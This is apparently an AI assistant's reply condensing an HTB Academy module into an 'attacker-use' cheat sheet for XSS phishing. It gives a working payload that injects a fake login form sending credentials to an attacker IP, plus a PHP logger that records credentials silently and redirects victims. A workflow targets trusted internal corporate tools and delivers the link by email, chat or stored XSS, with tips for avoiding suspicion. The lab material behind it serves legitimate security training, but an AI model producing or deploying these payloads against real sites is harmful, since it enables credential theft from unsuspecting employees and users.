Got it. I see exactly what you're doing. You are feeding me the **HTB Academy XSS Phishing module content**, and you want it distilled into the **exact same clean, Obsidian-ready, attacker-use format** we established earlier. 

No fluff. No premature SQLi. Just this specific phishing workflow, compressed into a highly actionable cheat sheet.

Here is the **Obsidian-Ready XSS Phishing & Credential Harvesting Cheat Sheet**:

---

`md
## 🎣 XSS Phishing & Credential Harvesting Cheat Sheet

---

### 🎯 1. Core Concept

> [!INFO]
> **Goal:** Inject a fake, legitimate-looking login form into a vulnerable page to harvest credentials.
> **Mechanism:** Use XSS to execute `document.write()` to render the form, then point the form's `action` to an attacker-controlled server.

---

### 🧪 2. Discovery & Context Mapping

1. Identify injection point (e.g., `?url=...`).
2. Test basic payload: `<script>alert(1)</script>`.
3. **CRITICAL STEP:** View Page Source / Inspector to see *how* the input is reflected.
   - Is it inside an `img src`?
   - Is it raw HTML?
   - What surrounding tags need to be closed or removed?

> [!CHECK]
> In the HTB Image Viewer scenario, the input is reflected directly into the DOM, allowing raw HTML/JS injection, but leaves original page elements visible that must be cleaned up.

---

### 🧬 3. Payload Construction (Step-by-Step)

#### 🔹 Step A: Inject the Fake Form
Use `document.write()` to render the phishing form. Point `action` to your listener IP.
```javascript
document.write('<h3>Please login to continue</h3><form action="http://OUR_IP"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
```

#### 🔹 Step B: Clean Up the Original UI
Remove the original input form so the victim isn't confused by duplicate fields. Inspect the element to find its ID (e.g., `urlform`).
```javascript
document.getElementById('urlform').remove();
```

#### 🔹 Step C: Comment Out Trailing HTML
Prevent the rest of the original page from rendering below your fake form and breaking the illusion.
```html
<!--
```

---

### 💥 4. The Final Combined Payload

Minify and chain the steps together. **URL-encode this entire string** before placing it in the URL parameter.

```javascript
document.write('<h3>Please login to continue</h3><form action="http://OUR_IP"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');document.getElementById('urlform').remove();<!--
```

> [!ATTENTION]  
> Always replace `OUR_IP` with your actual attacker machine IP (e.g., `tun0` IP). URL-encode the payload before sending: `document.write(...)` becomes `%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65...`

---

### ⚙️ 5. Credential Harvesting Setup

#### 🔹 Phase 1: Quick Validation (Netcat)
Use to verify the form is sending data correctly. *Warning: Netcat exits after one connection.*
```bash
sudo nc -lvnp 80
```
*Expected Output:* `GET /?username=test&password=test&submit=Login HTTP/1.1`

#### 🔹 Phase 2: Stealth Harvesting (PHP Server)
Use a PHP script to log credentials silently and redirect the victim back to the legitimate page, raising zero suspicion.

**1. Create `index.php`:**
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    fclose($file);
    // Redirect victim back to the legitimate page
    header("Location: http://SERVER_IP/phishing/index.php");
    exit();
}
?>
```

**2. Start the PHP Server:**
```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# (Save the above code as index.php in this directory)
sudo php -S 0.0.0.0:80
```

**3. Verify Capture:**
```bash
cat creds.txt
# Output: Username: test | Password: test
```

---

### 🔍 6. Execution Workflow (REAL METHOD)

> [!SUCCESS]

1. **Recon:** Find reflected XSS in a trusted, high-value internal app (e.g., HR portal, wiki).
2. **Craft:** Build the `document.write` + `remove()` + `<!--` payload.
3. **Test:** Point `action` to your PHP server. Test it yourself in an incognito window.
4. **Verify:** Check `creds.txt` and ensure the redirect works seamlessly.
5. **Weaponize:** URL-encode the final payload.
6. **Deliver:** Send the malicious link via email, chat, or trigger it via a stored XSS vector (e.g., forum signature, support ticket).

---

### 🧠 7. Where This Works Best

> [!ABSTRACT]

- Internal corporate tools (employees trust the domain).
- Portals requiring frequent re-authentication (SSO timeout pages).
- Applications with Stored XSS (payload persists for all visitors).
- Password reset pages.

---

## ⚠️ Operator Notes

> [!FAILURE]

If the attack fails or looks suspicious:
- **Form looks broken:** You forgot to URL-encode the payload, or a quote broke the JS string.
- **Victim sees "Site can't be reached":** Your PHP server isn't running, or a firewall is blocking port 80.
- **Original page still shows:** The `id` in `getElementById` is wrong, or you forgot the `<!--` at the end.
- **CSP Blocking:** `document.write` may be blocked by strict CSP. Fallback to DOM manipulation (`createElement`, `appendChild`).

---

> [!ATTENTION]

**The illusion is everything.**  
If the victim sees the original URL bar input, a broken layout, or gets a connection error after clicking "Login", the phishing attempt fails. Clean up the DOM perfectly and handle the HTTP request gracefully.
```

---

### 🔥 How to use this:
1. Copy the entire block above directly into a new Obsidian note (e.g., `XSS_Phishing_CheatSheet.md`).
2. The callouts will render perfectly in Obsidian.
3. When you are in a lab or engagement, jump straight to **Section 4 (Final Combined Payload)** and **Section 5 (Phase 2 Setup)**.

Want to distill another specific HTB/PortSwigger module (like **Blind XSS with XSS Hunter**, **CSP Bypass**, or **Prototype Pollution**) into this exact format? Just drop the text. 🎯